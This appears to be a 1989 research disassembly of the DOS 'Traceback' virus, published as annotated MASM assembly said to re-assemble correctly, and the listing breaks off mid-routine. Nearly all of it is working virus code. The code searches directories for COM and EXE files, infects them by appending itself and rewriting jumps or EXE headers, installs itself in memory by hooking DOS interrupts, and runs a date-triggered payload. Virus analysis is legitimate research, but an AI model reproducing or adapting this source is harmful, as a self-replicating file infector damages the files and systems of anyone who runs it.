	page	65,132
	title	The 'Traceback' Virus
; ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
; º                 British Computer Virus Research Centre                   º
; º  12 Guildford Street,   Brighton,   East Sussex,   BN1 3LS,   England    º
; º  Telephone:     Domestic   0273-26105,   International  +44-273-26105    º
; º                                                                          º
; º                          The 'Traceback' Virus                           º
; º                Disassembled by Joe Hirst,      June  1989                º
; º                                                                          º
; º                      Copyright (c) Joe Hirst 1989.                       º
; º                                                                          º
; º      This listing is only to be made available to virus researchers      º
; º                or software writers on a need-to-know basis.              º
; ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼

	; The disassembly has been tested by re-assembly using MASM 5.0.

BOOT	SEGMENT AT 0

	ORG	24H
BW0024	DW	?			; Int 9 offset
BW0026	DW	?			; Int 9 segment

	ORG	70H
BW0070	DW	?			; Int 1CH offset
BW0072	DW	?			; Int 1CH segment

	ORG	80H
BD0080	EQU	THIS DWORD
BW0080	DW	?			; Int 20H offset
BW0082	DW	?			; Int 20H segment
BW0084	DW	?			; Int 21H offset
BW0086	DW	?			; Int 21H segment

	ORG	90H
BW0090	DW	?			; Int 24H offset
BW0092	DW	?			; Int 24H segment

	ORG	9CH
BD009C	EQU	THIS DWORD
BW009C	DW	?			; Int 27H offset
BW009E	DW	?			; Int 27H segment

	ORG	449H
BB0449	DB	?			; Current VDU mode

BOOT	ENDS

CODE	SEGMENT BYTE PUBLIC 'CODE'
	ASSUME CS:CODE,DS:CODE

DW0000	DW	02EEBH			; \ Stored start of host program
DB0002	DB	090H			; /
DB0003	DB	0FFH
DB0004	DB	0FBH			; Infection countdown
DD0005	EQU	THIS DWORD
DW0005	DW	100H
DW0007	DW	0CBBH
DW0009	DW	4DH
DB000B	DB	0, 0
DB000D	DB	0EBH, 2EH, 90H, 0FFH, 0FFH, 6CH, 6CH
DB0014	DB	'o - Copyright S & S E', 29 DUP (0)
CURDIR	DB	0, 'PLIC', 60 DUP (0)	; Current directory
DTAFLE	DB	3, '????????COM ', 2, 0, 0, 0, 'c:\m '
	DB	1AH, 0, 0AFH, 0AH, 95H, 58H, 0, 0
	DB	'COMMAND.COM', 3 DUP (0)
DTADIR	DB	1, '???????????', 10H, 5, 7 DUP (0)
	DB	20H, 0E9H, 11H, 0B5H, 12H, 0F6H, 48H, 2, 0
	DB	'CAT-TWO.ARC', 0, 0, 0
DB00DF	DB	0
SEGREG	DW	0AEBH
PTHDSK	DB	2			; Pathname drive
CURDSK	DB	2			; Current disk
ATTR_F	DW	0020H			; File attributes
TIME_F	DW	22B6H			; File time
DATE_F	DW	1174H			; File date
I24_OF	DW	04EBH			; Old Int 24H offset
I24_SG	DW	0A17H			; Old Int 24H segment
CRTERR	DB	0			; Critical error flag
F_HAND	DW	0			; File handle
F_TIME	DW	5951H			; File time
F_DATE	DW	0F8BH			; File date
F_ATTR	DW	0020H			; File attributes
V_SIGN	DB	056H, 047H, 031H	; Virus signature

	; Entry point

BP0010:	JMP	SHORT BP0020

	DW	SIGNAT

BP0020:	CALL	BP0640			; Get relocation constant in SI
	CALL	BP0600			; Set Int 24H vector
	MOV	AH,19H			; Get current disk function
	INT	21H			; DOS service
	MOV	PTH_OF[SI],SI		 ; \ Address of pathname
	ADD	PTH_OF[SI],OFFSET DB0884 ; /
	MOV	PTH_SG[SI],CS		; Segment of pathname
	MOV	CURDSK[SI],AL		; Save current disk
	CALL	BP0510			; Get installed virus segment
	MOV	DL,PTHDSK[DI]		; Get pathname drive in installed virus
	MOV	AX,DS			; Get segment in installed virus
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	JNZ	BP0030			; Branch if not installed
	MOV	PTH_OF[SI],OFFSET DB0884+100H ; Pathname in installed virus
	MOV	PTH_SG[SI],AX		; Segment in installed virus
	CMP	DL,0FFH			; Is there a pathname drive?
	JE	BP0030			; Branch if not
	MOV	AH,0EH			; Select disk function
	INT	21H			; DOS service
BP0030:	MOV	BYTE PTR SWTCHB[SI],80H	; Set on switch eight
	MOV	F_HAND[SI],0		; Clear file handle
	MOV	AH,2AH			; Get date function
	INT	21H			; DOS service
	CMP	CX,07C4H		; Is year 1988?
	JGE	BP0040			; Branch if not before
	JMP	SHORT BP0070

PTH_OF	DW	0F8CH			; Offset of pathname
PTH_SG	DW	0AEBH			; Segment of pathname
ISWTCH	DB	0			; Infected file switch

	; 1988 or later

BP0040:	JG	BP0050			; Branch if after 1988
	CMP	DH,0CH			; Is month December?
	JL	BP0070			; Branch if not
	CMP	DL,5			; 5th of December?
	JL	BP0070			; Branch if before
	CMP	DL,1CH			; 28th of December?
	JL	BP0060			; Branch if before
BP0050:	MOV	DSPCNT[SI],0FFDCH	; Start display count (60 mins)
	MOV	BYTE PTR SWTCHB[SI],88H	; Switches four & eight
BP0060:	CMP	DB0004[SI],0F8H		; Has infection count reached target?
	JNB	BP0080			; Branch if not
	ASSUME	DS:NOTHING
BP0070:	MOV	CRTERR[SI],0		; Clear critical error flag
	JMP	BP0270

	; Unreachable code

	ASSUME	DS:CODE
	CMP	DB0004[SI],0F8H		; Has infection count reached target?
	JNB	BP0080			; Branch if not
	OR	BYTE PTR SWTCHB[SI],4	; Set on switch three

BP0080:	MOV	DB00DF[SI],0		; Set not-first-time switch off
	MOV	DX,PTH_OF[SI]		; Get pathname offset
	MOV	DS,PTH_SG[SI]		; Get pathname segment
	MOV	AX,4300H		; Get attributes function
	CALL	BP0230			; Perform a DOS service
	JB	BP0090			; Branch if error
	ASSUME	DS:NOTHING
	MOV	F_ATTR[SI],CX		; Save file attributes
	AND	CL,0FEH			; Switch off read-only
	MOV	AX,4301H		; Set attributes function
	CALL	BP0230			; Perform a DOS service
	JB	BP0090			; Branch if error
	MOV	AX,3D02H		; Open handle R/W function
	INT	21H			; DOS service
	JB	BP0090			; Branch if error
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	ASSUME	DS:CODE
	MOV	F_HAND[SI],AX		; Save file handle
	MOV	BX,AX			; Move file handle
	MOV	AX,5700H		; Get file date and time function
	INT	21H			; DOS service
	MOV	F_TIME[SI],CX		; Save file time
	MOV	F_DATE[SI],DX		; Save file date
	DEC	DB0004[SI]		; Decrement infection count
	MOV	DX,FLENLO[SI]		; Get file length, low word
	MOV	CX,FLENHI[SI]		; Get file length, high word
	ADD	DX,OFFSET DB0004	; \ Add to length
	ADC	CX,0			; /
	MOV	AX,4200H		; Move file pointer (start) function
	INT	21H			; DOS service
BP0090:	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	TEST	BYTE PTR SWTCHB[SI],4	; Test switch three
	JZ	BP0100			; Branch if off
	CALL	BP0330			; Write infection count
	JMP	BP0270

	; Change directory to root

BP0100:	XOR	DL,DL			; Default drive
	MOV	AH,47H			; Get current directory function
	PUSH	SI
	ADD	SI,46H			; Address directory store
	INT	21H			; DOS service
	POP	SI
	CMP	CRTERR[SI],0		; Test critical error flag
	JNE	BP0110			; Branch if set
	CALL	BP0250			; Make root dir current dir
	JNB	BP0120			; Branch if no error
BP0110:	JMP	BP0070

	; Find COM files

BP0120:	MOV	DX,SI			; \ Address DTA area
	ADD	DX,OFFSET DTAFLE	; /
	MOV	AH,1AH			; Set DTA function
	INT	21H			; DOS service
	MOV	[SI+5],'.*'		; \
	MOV	[SI+7],'OC'		;  ) '*.COM'
	MOV	WORD PTR [SI+9],'M'	; /
	MOV	AH,4EH			; Find first file function
	MOV	DX,SI			; \ Address file spec
	ADD	DX,5			; /
BP0130:	MOV	CX,0020H		; Attributes - archive
	CALL	BP0230			; Perform a DOS service
	JB	BP0160			; Move on to EXE files
	MOV	DX,SI			; \ Address filename in DTA
	ADD	DX,OFFSET DTAFLE+1EH	; /
	MOV	ISWTCH[SI],0		; Set infected file switch off
	CALL	BP0350			; Process file
	JB	BP0150			; Error or infected file found
	CALL	BP0330			; Write infection count
BP0140:	JMP	BP0260

BP0150:	CMP	CRTERR[SI],0		; Test critical error flag
	JNE	BP0140			; Branch if set
	CMP	ISWTCH[SI],0		; Test infected file switch
	JNE	BP0200			; Branch if on
	MOV	AH,4FH			; Find next file function
	JMP	BP0130

	; Find EXE files

BP0160:	MOV	[SI+7],'XE'		; \ '*.EXE'
	MOV	WORD PTR [SI+9],'E'	; /
	MOV	AH,4EH			; Find first file function
	MOV	DX,SI			; \ Address file spec
	ADD	DX,5			; /
BP0170:	MOV	CX,0020H		; Attributes - archive
	CALL	BP0230			; Perform a DOS service
	JB	BP0200			; No more files
	MOV	DX,SI			; \ Address filename in DTA
	ADD	DX,OFFSET DTAFLE+1EH	; /
	MOV	ISWTCH[SI],0		; Set infected file switch off
	CALL	BP0350			; Process file
	JB	BP0190			; Error or infected file found
	CALL	BP0330			; Write infection count
BP0180:	JMP	BP0260

	ASSUME	DS:NOTHING
BP0190:	CMP	CRTERR[SI],0		; Test critical error flag
	JNE	BP0180			; Branch if set
	ASSUME	DS:CODE
	CMP	ISWTCH[SI],0		; Test infected file switch
	JNE	BP0200			; Branch if on
	MOV	AH,4FH			; Find next file function
	JMP	BP0170

BP0200:	CALL	BP0250			; Make root dir current dir
	MOV	DX,SI			; \ Address 2nd DTA
	ADD	DX,OFFSET DTADIR	; /
	MOV	AH,1AH			; Set DTA function
	INT	21H			; DOS service
BP0210:	MOV	AH,4FH			; Find next file function
	MOV	CX,0010H		; Find directories
	CMP	DB00DF[SI],0		; First time?
	JNE	BP0220			; Branch if not
	MOV	DB00DF[SI],1		; Set not-first-time switch
	MOV	[SI+5],'.*'		; \ '*.*'
	MOV	WORD PTR [SI+7],'*'	; /
	MOV	AH,4EH			; Find first file function
	MOV	DX,SI			; \ Address file spec
	ADD	DX,5			; /
BP0220:	CALL	BP0230			; Perform a DOS service
	JB	BP0260			; No more files
	TEST	DTADIR[SI+15H],10H	; Is it a directory?
	JZ	BP0210			; Branch if not
	MOV	DX,SI			; \ Address file name in DTA
	ADD	DX,OFFSET DTADIR+1EH	; /
	MOV	AH,3BH			; Change current directory function
	CALL	BP0230			; Perform a DOS service
	JB	BP0260			; Branch if error
	JMP	BP0120			; Look for COM files

	; Perform a DOS service

BP0230:	INT	21H			; DOS service
	JB	BP0240			; Branch if error
	ASSUME	DS:NOTHING
	TEST	CRTERR[SI],0FFH		; Test critical error flag
	JZ	BP0240			; Branch if not set
	STC
BP0240:	RET

	; Make root dir current dir

BP0250:	MOV	WORD PTR [SI+5],'\'	; Root dir
	MOV	DX,SI			; \ Address root dir pathname
	ADD	DX,5			; /
	MOV	AH,3BH			; Change current directory function
	CALL	BP0230			; Perform a DOS service
	RET

	ASSUME	DS:CODE
BP0260:	CALL	BP0250			; Make root dir current dir
	MOV	DX,SI			; \ Address
	ADD	DX,46H			; /
	MOV	AH,3BH			; Change current directory function
	INT	21H			; DOS service
BP0270:	MOV	BX,F_HAND[SI]		; Get file handle
	OR	BX,BX			; Test for a handle
	JZ	BP0290			; Branch if none
	MOV	CX,F_ATTR[SI]		; Get file attributes
	MOV	DX,PTH_OF[SI]		; Get pathname offset
	MOV	DS,PTH_SG[SI]		; Get pathname segment
	CMP	CX,20H			; Are attributes archive?
	JE	BP0280			; Branch if yes
	MOV	AX,4301H		; Set attributes function
	INT	21H			; DOS service
BP0280:	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	MOV	CX,F_TIME[SI]		; Get file time
	MOV	DX,F_DATE[SI]		; Get file date
	MOV	AX,5701H		; Set file date and time function
	INT	21H			; DOS service
	MOV	AH,3EH			; Close handle function
	INT	21H			; DOS service
BP0290:	MOV	DL,CURDSK[SI]		; Get current disk
	MOV	AH,0EH			; Select disk function
	INT	21H			; DOS service
	CALL	BP0610			; Restore Int 24H vector
	POP	AX			; ? 
	MOV	SEGREG[SI],AX		; Save segment
	CMP	BYTE PTR [SI+3],0FFH	; Should virus be installed?
	JE	BP0300			; Branch if yes
	ADD	AX,0010H		; Add PSP length to segment
	ADD	WORD PTR [SI+2],AX	; Store segment
	POP	AX			; ?
	POP	DS			; ?
	JMP	DWORD PTR CS:[SI]	; Branch to ?

	; Install resident copy of virus

BP0300:	CALL	BP0510			; Get installed virus segment
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	MOV	AX,[SI]			; \ Replace first word of host
	MOV	DW0000+100H,AX		; /
	MOV	AL,[SI+2]		; \ Replace third byte of host
	MOV	DB0002+100H,AL		; /
	JZ	BP0310			; Branch if installed
	MOV	BX,DS			; Get current segment
	ADD	BX,01D0H		; Add length of installed segment
	MOV	ES,BX			; Segment to copy to
	MOV	DI,SI			; Start of virus
	MOV	DX,SI			; Copy relocation factor
	MOV	CX,OFFSET ENDADR	; Length of virus
	CALL	BP1160			; Copy virus and transfer control
	MOV	CX,DX			; Relocation factor (as length)
	MOV	SI,DX			; Relocation factor as source
	DEC	SI			; Back one byte
	MOV	DI,SI			; Same offset as target
	STD				; Going backwards
	REPZ	MOVSB			; Copy host program
	PUSH	DS			; \ Set ES to DS
	POP	ES			; /
	MOV	DI,0100H		; Target following PSP
	MOV	DS,BX			; Current segment as source
	MOV	SI,DX			; Start of virus
	MOV	CX,OFFSET ENDADR	; Length of virus
	CALL	BP1160			; Copy virus and transfer control
	MOV	SI,0100H		; New relocation factor
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	CALL	BP0580			; Install interrupts
	MOV	DX,01D0H		; Get length of installed segment
BP0310:	MOV	DI,CS			; \ New segment for host
	ADD	DI,DX			; /
	MOV	WORD PTR [SI+5],0100H	; Host offset
	MOV	[SI+7],DI		; Host segment
	POP	AX			; ?
	POP	DS			; ?
	MOV	DS,DI			; \
	MOV	ES,DI			;  ) Set up other segment registers
	MOV	SS,DI			; /
	XOR	BX,BX			; Clear register
	XOR	CX,CX			; Clear register
	XOR	BP,BP			; Clear register
	JMP	DWORD PTR CS:[SI+5]	; Branch to host program

	; Clear error flag and return

	ASSUME	DS:NOTHING
BP0320:	MOV	CRTERR[SI],0		; Clear critical error flag
	RET

	; Write infection count

	ASSUME	DS:CODE
BP0330:	MOV	BX,F_HAND[SI]		; Get file handle
	OR	BX,BX			; Test for a handle
	JZ	BP0340			; Branch if none
	MOV	DX,SI			; \ Address infection count
	ADD	DX,OFFSET DB0004	; /
	MOV	CX,1			; Length to write
	MOV	AH,40H			; Write handle function
	INT	21H			; DOS service
BP0340:	RET

	; Process file

BP0350:	PUSH	DX
	MOV	AH,19H			; Get current disk function
	INT	21H			; DOS service
	ADD	AL,'A'			; Convert to letter
	MOV	AH,':'			; Disk separator
	MOV	WORD PTR DB0884[SI],AX	; Disk in pathname
	MOV	BYTE PTR DB0884[SI+2],'\' ; Root directory in pathname
	PUSH	SI
	ADD	SI,OFFSET DB0884+3	; Address next position in pathname
	MOV	AH,47H			; Get current directory function
	MOV	DI,SI			; Buffer area
	XOR	DL,DL			; Default drive
	INT	21H			; DOS service
	POP	SI
	DEC	DI			; Back one character
BP0360:	INC	DI			; Next character
	MOV	AL,[DI]			; Get character
	OR	AL,AL			; Is it zero
	JNZ	BP0360			; Branch if not
	POP	BX
	MOV	BYTE PTR [DI],'\'	; Store directory separator
	INC	DI			; Next position
	MOV	DX,BX			; Copy filename pointer
BP0370:	MOV	AL,[BX]			; Get character
	MOV	[DI],AL			; Store in pathname
	INC	BX			; Next input position
	INC	DI			; Next output position
	OR	AL,AL			; End of filename?
	JNZ	BP0370			; Next character if not
BP0380:	MOV	AX,4300H		; Get attributes function
	CALL	BP0230			; Perform a DOS service
	JB	BP0320			; Branch if error
	ASSUME	DS:NOTHING
	MOV	ATTR_F[SI],CX		; Save attributes
	AND	CX,00FEH		; Set off read only
	MOV	AX,4301H		; Set attributes function
	CALL	BP0230			; Perform a DOS service
	JB	BP0320			; Branch if error
	MOV	AX,3D02H		; Open handle R/W function
	CALL	BP0230			; Perform a DOS service
	JB	BP0320			; Branch if error
	MOV	BX,AX			; Move handle
	PUSH	DS
	PUSH	DX
	CALL	BP0400			; Infect file if not infected
	POP	DX
	POP	DS
	PUSHF
	MOV	CX,ATTR_F[SI]		; Get attributes
	CMP	CX,20H			; Archive only?
	JE	BP0390			; Branch if yes
	MOV	AX,4301H		; Set attributes function
	INT	21H			; DOS service
BP0390:	MOV	CX,TIME_F[SI]		; Get file time
	MOV	DX,DATE_F[SI]		; Get file date
	MOV	AX,5701H		; Set file date and time function
	INT	21H			; DOS service
	MOV	AH,3EH			; Close handle function
	INT	21H			; DOS service
	POPF
	RET

	; Infect file if not infected

BP0400:	MOV	AX,5700H		; Get file date and time function
	INT	21H			; DOS service
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	ASSUME	DS:CODE
	MOV	TIME_F[SI],CX		; Save file time
	MOV	DATE_F[SI],DX		; Save file date
	MOV	DX,SI			; \ Address buffer
	ADD	DX,0DH			; /
	MOV	DI,DX			; Copy this address
	MOV	AH,3FH			; Read handle function
	MOV	CX,001CH		; EXE header length
	INT	21H			; DOS service
	CMP	WORD PTR [DI],'ZM'	; EXE header?
	JE	BP0430			; Branch if yes
	CALL	BP0500			; Move pointer to end of file
	ADD	AX,OFFSET SIGNAT+100H	; Add length of virus
	JB	BP0410			; Branch if too big for a COM
	CMP	BYTE PTR [DI],0E9H	; Does it start with a near jump?
	JNE	BP0420			; Branch if not
	MOV	DX,[DI+1]		; Get displacement from jump
	XOR	CX,CX			; Clear top 
	MOV	AX,4200H		; Move file pointer (start) function
	INT	21H			; DOS service
	MOV	DX,DI			; Read buffer
	ADD	DX,001CH		; Add length of EXE header
	MOV	AH,3FH			; Read handle function
	MOV	CX,3			; Length to read
	INT	21H			; DOS service
	CALL	BP0440			; Test virus signature on file
	JNB	BP0420			; Branch if not present
	ASSUME	DS:NOTHING
	MOV	ISWTCH[SI],1		; Set infected file switch on
BP0410:	RET

	ASSUME	DS:CODE
BP0420:	CALL	BP0500			; Move pointer to end of file
	MOV	FLENLO[SI],AX		; Save file length, low word
	MOV	FLENHI[SI],DX		; Save file length, high word
	PUSH	AX
	MOV	WORD PTR [DI+3],0FFFFH	; Initialise count
	MOV	CX,5			; Length to write
	MOV	AH,40H			; Write handle function
	MOV	DX,DI			; Address start of buffer
	INT	21H			; DOS service
	MOV	DX,SI			; \ Address start of virus
	ADD	DX,5			; /
	MOV	CX,OFFSET SIGNAT	; Length of virus
	MOV	AH,40H			; Write handle function
	INT	21H			; DOS service
	MOV	AX,4200H		; Move file pointer (start) function
	XOR	CX,CX			; \ No displacement
	XOR	DX,DX			; /
	INT	21H			; DOS service
	MOV	BYTE PTR [DI],0E9H	; Near jump instruction
	POP	AX			; Recover length of file
	ADD	AX,OFFSET BP0010-3	; Jump offset to entry point
	MOV	[DI+1],AX		; Store in jump instruction
	MOV	DX,DI			; Address of jump instruction
	MOV	CX,3			; Length to write
	MOV	AH,40H			; Write handle function
	INT	21H			; DOS service
	CLC
	RET

	; EXE file

BP0430:	CMP	WORD PTR [DI+0CH],0FFFFH ; Is max alloc asking for maximum?
	JNE	BP0450			; Branch if not
	PUSH	SI
	MOV	SI,[DI+14H]		; Get initial offset
	MOV	CX,[DI+16H]		; Get initial segment
	MOV	AX,CX			; Copy segment
	MOV	CL,CH			; Move top byte down
	XOR	CH,CH			; Clear top
	SHR	CX,1			; \
	SHR	CX,1			;  \ Move top nibble into position
	SHR	CX,1			;  /
	SHR	CX,1			; /
	SHL	AX,1			; \
	SHL	AX,1			;  \ Move rest of segment
	SHL	AX,1			;  /
	SHL	AX,1			; /
	ADD	SI,AX			; \ Add to offset
	ADC	CX,0			; /
	SUB	SI,3			; \ Subtract length of signature
	SBB	CX,0			; /
	MOV	AX,[DI+8]		; Get size of header
	CALL	BP0490			; Move segment to two-register offset
	ADD	SI,AX			; \ Add to starting position
	ADC	CX,DX			; /
	MOV	DX,SI			; Move low word
	POP	SI
	MOV	AX,4200H		; Move file pointer (start) function
	INT	21H			; DOS service
	MOV	DX,DI			; Address buffer
	ADD	DX,001CH		; Add length of EXE header
	MOV	AH,3FH			; Read handle function
	MOV	CX,3			; Length to read
	INT	21H			; DOS service
	CALL	BP0440			; Test virus signature on file
	JNB	BP0480			; Branch if not present
	ASSUME	DS:NOTHING
	MOV	ISWTCH[SI],1		; Set infected file switch on
	RET

	; Test virus signature on file

BP0440:	CMP	WORD PTR [DI+1CH],4756H	; Look for virus signature
	JNE	BP0470			; Branch if not found
	CMP	BYTE PTR [DI+1EH],31H	; Look for rest of signature
	JNE	BP0470			; Branch if not found
BP0450:	STC
BP0460:	RET

BP0470:	CLC
	RET

	; Infect EXE file

	ASSUME	DS:CODE
BP0480:	CALL	BP0500			; Move pointer to end of file
	MOV	FLENLO[SI],AX		; Save file length, low word
	MOV	FLENHI[SI],DX		; Save file length, high word
	MOV	CX,[DI+4]		; Get size of file in pages
	SHL	CX,1			; Multiply by two
	XCHG	CH,CL			; Reverse bytes
	MOV	BP,CX			; Copy
	AND	BP,0FF00H		; Convert to bytes (low word)
	XOR	CH,CH			; Convert to bytes (high word)
	ADD	BP,[DI+6]		; \ Add number of relocation entries
	ADC	CX,0			; /
	SUB	BP,AX			; \ Subtract current length
	SBB	CX,DX			; /
	JB	BP0460			; Branch if overlay
	PUSH	AX			; Save length of host, low word
	PUSH	DX			; Save length of host, high word
	PUSH	[DI+18H]		; Save offset to relocation table
	MOV	BYTE PTR [DI+18H],0FFH	; Original entry address marker
	MOV	CX,5			; Length to write
	MOV	AH,40H			; Write handle function
	MOV	DX,DI			; \ Address host entry address
	ADD	DX,14H			; /
	INT	21H			; DOS service
	POP	[DI+18H]		; Recover offset to relocation table
	MOV	DX,SI			; \ Address start of virus
	ADD	DX,5			; /
	MOV	CX,OFFSET SIGNAT	; Length of virus
	MOV	AH,40H			; Write handle function
	INT	21H			; DOS service
	MOV	AX,4200H		; Move file pointer (start) function
	XOR	CX,CX			; \ No displacement
	XOR	DX,DX			; /
	INT	21H			; DOS service
	POP	[DI+16H]		; Recover length of host, high word
	POP	[DI+14H]		; Recover length of host, low word
	ADD	WORD PTR [DI+14H],00FAH	; \ Add entry point
	ADC	WORD PTR [DI+16H],0	; /
	MOV	AX,[DI+8]		; Get size of header
	CALL	BP0490			; Move segment to two-register offset
	SUB	[DI+14H],AX		; \ Subtract size of header
	SBB	[DI+16H],DX		; /
	MOV	CL,0CH			; Bits to move
	SHL	WORD PTR [DI+16H],CL	; Convert high word to segment
	MOV	AX,OFFSET ENDADR	; Length of virus
	ADD	AX,[DI+2]		; Add bytes in last paragraph
	MOV	[DI+2],AX		; Store new figure
	AND	[DI+2],01FFH		; Set off top bits
	MOV	AL,AH			; Copy high byte
	XOR	AH,AH			; Clear top of register
	SHR	AX,1			; Divide by two
	ADD	[DI+4],AX		; Add to pages
	MOV	DX,DI			; Move address of EXE header
	MOV	CX,001CH		; EXE header length
	MOV	AH,40H			; Write handle function
	INT	21H			; DOS service
	CLC
	RET

	; Move segment to two-register offset

BP0490:	XOR	DX,DX			; Clear register
	SHL	AX,1			; \ Move double one bit
	RCL	DX,1			; /
	SHL	AX,1			; \ Move double one bit
	RCL	DX,1			; /
	SHL	AX,1			; \ Move double one bit
	RCL	DX,1			; /
	SHL	AX,1			; \ Move double one bit
	RCL	DX,1			; /
	RET

	; Move pointer to end of file

BP0500:	XOR	DX,DX			; \ No displacement
	XOR	CX,CX			; /
	MOV	AX,4202H		; Move file pointer (EOF) function
	INT	21H			; DOS service
	RET

	; Get installed virus segment

BP0510:	XOR	AX,AX			; \ Address zero
	MOV	DS,AX			; /
	LDS	DI,BD009C		; Load Int 27H vector
	LDS	DI,[DI+1]		; Get vector from far jump
	MOV	AX,DI			; Save offset
	SUB	DI,OFFSET BP0780-V_SIGN	; Address from jump to old Int 27H
	CALL	BP0530			; Test virus signature in memory
	JZ	BP0520			; Branch if found
	MOV	DI,AX			; Retrieve offset
	SUB	DI,OFFSET BP0770-V_SIGN	; Address from new Int 27H routine
	CALL	BP0530			; Test virus signature in memory
	JZ	BP0520			; Branch if found
	LDS	DI,BD0080		; Load Int 20H vector
	LDS	DI,[DI+1]		; Get vector from far jump
	MOV	AX,DI			; Save offset
	SUB	DI,OFFSET BP0630-V_SIGN	; Address from jump to old Int 20H
	CALL	BP0530			; Test virus signature in memory
	JZ	BP0520			; Branch if found
	MOV	DI,AX			; Retrieve offset
	SUB	DI,OFFSET BP0620-V_SIGN	; Address from new Int 27H routine
	CALL	BP0530			; Test virus signature in memory
BP0520:	RET

	; Test virus signature in memory

BP0530:	XOR	DX,DX			; Clear register
	CMP	WORD PTR [DI],4756H	; Look for virus signature
	JNE	BP0540			; Branch if not present
	CMP	BYTE PTR [DI+2],31H	; Look for rest of signature
	JE	BP0550			; Branch if there
BP0540:	INC	DX			; Set no virus marker
BP0550:	SUB	DI,OFFSET V_SIGN	; Subtract offset of signature
	OR	DX,DX			; Test no virus marker
	RET

	; Create far jump

BP0560:	MOV	AL,0EAH			; Far jump
	STOSB				; Store jump instruction
	MOV	AX,CX			; \ Address routine
	ADD	AX,SI			; /
	STOSW				; Store offset
	MOV	AX,CS			; Get segment
	STOSW				; Store segment
BP0570:	RET

	; Install interrupts

BP0580:	OR	DX,DX
	JZ	BP0570			; Dont install if yes
	PUSH	DS
	PUSH	ES
	MOV	ES,SEGREG[SI]		; Get segment register
	MOV	DI,00ECH		; Address far jump table
	CLD
	MOV	CX,OFFSET BP0880	; Int 1CH routine
	CALL	BP0560			; Create Int 1CH far jump
	MOV	CX,OFFSET BP0620	; Int 20H routine
	CALL	BP0560			; Create Int 20H far jump
	MOV	CX,OFFSET BP0700	; Int 21H routine
	CALL	BP0560			; Create Int 21H far jump
	MOV	CX,OFFSET BP0770	; Int 27H routine
	CALL	BP0560			; Create Int 27H far jump
	XOR	AX,AX			; \ Address zero
	MOV	DS,AX			; /
	ASSUME	DS:BOOT
	CLI
	MOV	AX,00ECH		; Address Int 1CH far jump
	XCHG	AX,BW0070		; Install as Int 1CH offset
	MOV	CS:I1C_OF[SI],AX	; Save old Int 1CH offset
	MOV	AX,ES			; Get this segment
	XCHG	AX,BW0072		; Install as Int 1CH segment
	MOV	CS:I1C_SG[SI],AX	; Save old Int 1CH segment
	MOV	AX,00F1H		; Address Int 20H far jump
	XCHG	AX,BW0080		; Install as Int 20H offset
	MOV	CS:I20_OF[SI],AX	; Save old Int 20H offset
	MOV	AX,ES			; Get this segment
	XCHG	AX,BW0082		; Install as Int 20H segment
	MOV	CS:I20_SG[SI],AX	; Save old Int 20H segment
	MOV	AX,00F6H		; Address Int 21H far jump
	XCHG	AX,BW0084		; Install as Int 21H offset
	MOV	CS:I21_OF[SI],AX	; Save old Int 21H offset
	MOV	AX,ES			; Get this segment
	XCHG	AX,BW0086		; Install as Int 21H segment
	MOV	CS:I21_SG[SI],AX	; Save old Int 21H segment
	MOV	AX,00FBH		; Address Int 27H far jump
	XCHG	AX,BW009C		; Install as Int 27H offset
	MOV	CS:I27_OF[SI],AX	; Save old Int 27H offset
	MOV	AX,ES			; Get this segment
	XCHG	AX,BW009E		; Install as Int 27H segment
	MOV	CS:I27_SG[SI],AX	; Save old Int 27H segment
	POP	ES
	POP	DS
	STI
	RET

	; Reset interrupts

	ASSUME	DS:CODE
BP0590:	PUSH	ES
	MOV	ES,SEGREG[SI]		; Get segment register
	MOV	DI,00F1H		; Address far jump table (2nd entry)
	CLD
	MOV	CX,OFFSET BP0630	; Jump to old Int 20H
	CALL	BP0560			; Create Int 20H far jump
	MOV	CX,OFFSET BP0720	; Alternate Int 21H routine
	CALL	BP0560			; Create Int 21H far jump
	MOV	CX,OFFSET BP0780	; Jump to old Int 27H
	CALL	BP0560			; Create Int 27H far jump
	POP	ES
	RET

	; Set Int 24H vector

BP0600:	PUSH	ES
	XOR	AX,AX			; \ Address zero
	MOV	ES,AX			; /
	ASSUME	ES:BOOT
	MOV	AX,OFFSET BP0790	; \ Interrupt 24H routine
	ADD	AX,SI			; /
	XCHG	AX,BW0090		; Install as Int 24H offset
	MOV	I24_OF[SI],AX		; Save old Int 24H offset
	MOV	AX,CS			; Get this segment
	XCHG	AX,BW0092		; Install as Int 24H segment
	MOV	I24_SG[SI],AX		; Save old Int 24H segment
	POP	ES
	MOV	CRTERR[SI],0		; Clear critical error flag
	RET

	; Restore Int 24H vector

	ASSUME	DS:NOTHING
BP0610:	PUSH	ES
	XOR	AX,AX			; \ Address zero
	MOV	ES,AX			; /
	MOV	AX,I24_OF[SI]		; Get old Int 24H offset
	MOV	BW0090,AX		; Restore Int 24H offset
	MOV	AX,I24_SG[SI]		; Get old Int 24H segment
	MOV	BW0092,AX		; Restore Int 24H segment
	POP	ES
	ASSUME	ES:NOTHING
	RET

	; Interrupt 20H routine

BP0620:	JMP	BP0680

	; Interrupt 20H - jump to original routine

BP0630:	DB	0EAH			; Far jump to Int 20H
I20_OF	DW	0136CH			; Original Int 20H offset
I20_SG	DW	00291H			; Original Int 20H segment

	; Get relocation constant in SI

BP0640:	POP	BX			; Get return address
	PUSH	DS
	PUSH	AX
	PUSH	DS
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	ASSUME	DS:CODE
	CALL	BP0650			; \ Get current address
BP0650:	POP	SI			; /
	SUB	SI,OFFSET BP0650	; Subtract displacement from it
	JMP	BX			; Branch to return address

	; Free or allocate memory functions

BP0660:	CALL	BP0640			; Get relocation constant in SI
	PUSH	CX
